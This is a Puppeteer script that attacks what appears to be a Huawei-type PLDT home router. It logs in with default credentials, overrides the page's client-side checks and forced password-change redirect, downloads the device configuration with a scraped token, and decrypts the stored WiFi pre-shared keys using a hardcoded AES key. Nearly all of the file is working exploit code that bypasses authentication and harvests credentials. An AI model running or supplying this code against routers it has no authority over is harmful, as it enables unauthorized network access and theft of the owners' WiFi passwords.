const PUPPETEER = require('puppeteer');
const ROUTER = 'https://192.168.1.1';
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

(async () => {
  const b = await PUPPETEER.launch({headless: false, ignoreHTTPSErrors: true, args: ['--no-sandbox', '--ignore-certificate-errors', '--window-size=1280,720']});
  const p = await b.newPage();

  // Step 1: Login as admin:1234
  await p.goto(ROUTER + '/html/login_pldt.html', {waitUntil: 'domcontentloaded', ignoreHTTPSErrors: true});
  await sleep(3000);

  await p.evaluate(() => {
    window.CheckPassword = () => 0;
    window.setDisable = () => {};
    window.DisplayWifiPldt = () => {};
    document.getElementById('user_name').value = 'admin';
    document.getElementById('loginpp').value = '1234';
  });
  await sleep(500);
  await p.evaluate(() => document.getElementById('login_btn').click());
  await sleep(5000);
  console.log('1. Post-login URL:', p.url());

  // Step 2: Bypass the forced password change overlay
  // Try injecting JS to dismiss/skip the overlay
  await p.evaluate(() => {
    // Override functions that might block navigation
    window.onbeforeunload = null;
    // Try to find and click any 'skip' or 'cancel' button
    const skipBtn = document.querySelector('[id*=skip], [id*=cancel], [id*=later], [value*=Skip], [value*=Later], [class*=skip]');
    if (skipBtn) { console.log('Found skip button'); skipBtn.click(); }
  });
  await sleep(1000);

  // Try navigating directly to internal pages
  const targets = [
    '/index.asp',
    '/html/home/index.asp', 
    '/html/bbsp/userdevinfo/userdevinfo.asp',
    '/html/amp/wlanbasic/WlanBasic.asp',
  ];

  let gotWifi = false;
  for (const target of targets) {
    try {
      await p.goto(ROUTER + target, {waitUntil: 'domcontentloaded', ignoreHTTPSErrors: true, timeout: 10000});
      await sleep(2000);
      const text = await p.evaluate(() => document.body.innerText.substring(0, 100)).catch(() => '');
      console.log('2. Navigated to', target, 'URL:', p.url(), 'Text:', text.substring(0, 50));

      // Check if we're still on the modify page
      if (p.url().includes('default_pwdmodify')) {
        console.log('   -> Still on password change page, trying another approach...');
        continue;
      }

      // If we got past, try to get WiFi password
      if (target.includes('WlanBasic') || target.includes('wlanbasic')) {
        const wifi = await p.evaluate(() => {
          const wpa = document.querySelector('input[name=WPAKey], input[name=WPAKey1], input[id$=WPAKey]');
          const ssid = document.querySelector('input[name=ssid], input[name=SSID], input[id$=SSID]');
          return {ssid: ssid ? ssid.value : null, wpa: wpa ? wpa.value : null, url: window.location.href};
        }).catch(() => ({}));
        console.log('3. WiFi info:', JSON.stringify(wifi));
        gotWifi = true;
        break;
      }
    } catch(e) {
      console.log('   Navigation error:', e.message.substring(0, 60));
    }
  }

  // Step 3: If we still can't bypass, try using the config download approach instead
  // (We already have check_config.js that downloads config via adminpldt, but now we have admin session)
  if (!gotWifi) {
    console.log('\n4. Trying config download approach...');
    // Navigate to cfgfile page from the password-change page
    await p.goto(ROUTER + '/html/ssmp/cfgfile/cfgfile.asp', {waitUntil: 'domcontentloaded', ignoreHTTPSErrors: true, timeout: 10000}).catch(() => {});
    await sleep(3000);
    console.log('   cfgfile URL:', p.url());

    // If we got redirected back, try overriding the page's redirect
    if (p.url().includes('default_pwdmodify')) {
      console.log('   Blocked by password change - using location override hack');
      // Kill the redirect by stopping navigation and forcefully navigating
      await p.evaluate(() => {
        window.stop();
        window.location.href = '/html/ssmp/cfgfile/cfgfile.asp';
      });
      await sleep(3000);
      console.log('   Forced URL:', p.url());
    }

    const token = await p.evaluate(() => document.getElementById('hwonttoken')?.value || '').catch(() => '');
    console.log('   Token:', token);

    if (token) {
      // Download config
      let xml = await p.evaluate(async (t) => {
        try {
          const r = await fetch('/html/ssmp/cfgfile/cfgfiledown.cgi?&RequestFile=html/ssmp/cfgfile/cfgfile.asp', {
            method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: 'x.X_HW_Token=' + encodeURIComponent(t), credentials: 'include'
          });
          if (r.ok) return await r.text();
        } catch(e) {}
        return null;
      }, token).catch(() => null);

      if (xml) {
        // Extract WiFi passwords from config
        const ssid24 = xml.match(/InstanceID="1"[^>]*?SSID="([^"]+)"/);
        const ssid5 = xml.match(/InstanceID="5"[^>]*?SSID="([^"]+)"/);
        
        const KEY_HEX = '6fc6e3436a53b6310dc09a475494ac774e7afb21b9e58fc8e58b5660e48e2498';
        const HW_AES_AesEnhSysToLong = (buf) => { let o=0,v3=1; for(let i=0;i<5;i++){o+=v3*buf[i];v3*=0x5D;} return o>>>0; };
        const HW_AES_PlainToBin = (buf) => { if(buf.length%5!==0)return null; const o=Buffer.alloc(buf.length*4/5); let p=0; for(let i=0;i<o.length;i+=4){o.writeUInt32LE(HW_AES_AesEnhSysToLong(buf.slice(p,p+5)),i);p+=5;} return o; };
        function decryptHuawei(s) {
          if(!s.startsWith('$2')||!s.endsWith('$'))return null;
          const t=s.substring(2,s.length-1); const b=Buffer.from(t,'ascii');
          for(let i=0;i<b.length;i++){if(b[i]===0x7e)b[i]=0x1e;else b[i]-=0x21;}
          const BS=0x14; if(b.length%BS!==0)return null;
          const bc=Math.floor(b.length/BS), ivR=b.slice(bc*BS-BS,bc*BS), IV=HW_AES_PlainToBin(ivR);
          const da=HW_AES_PlainToBin(b.slice(0,bc*BS-BS)); if(!da||!IV)return null;
          const d=require('crypto').createDecipheriv('aes-256-cbc',Buffer.from(KEY_HEX,'hex'),IV); d.setAutoPadding(false);
          let dec=Buffer.concat([d.update(da),d.final()]); const pad=dec[dec.length-1];
          if(pad>0&&pad<=16)dec=dec.slice(0,dec.length-pad);
          return dec.toString('utf8').replace(/\0+$/,'');
        }
        function unescapeXml(s) { return s.replace(/&gt;/g,'>').replace(/&lt;/g,'<').replace(/&amp;/g,'&').replace(/&apos;/g,"'").replace(/&quot;/g,'"'); }

        const pskMatches = [...xml.matchAll(/PreSharedKey="([^"]+)"/g)];
        console.log('\n=== WiFi Passwords Found ===');
        for (let i = 0; i < pskMatches.length; i++) {
          const dec = decryptHuawei(unescapeXml(pskMatches[i][1]));
          const label = i === 0 ? '2.4GHz' : (i === 1 ? '5GHz' : 'Band ' + (i+1));
          const ssid = i === 0 ? (ssid24 ? ssid24[1] : '?') : (i === 1 ? (ssid5 ? ssid5[1] : '?') : '?');
          console.log(`  ${label} SSID: ${ssid}`);
          console.log(`  ${label} Password: ${dec}`);
        }
      }
    }
  }

  await sleep(3000);
  await b.close();
})();
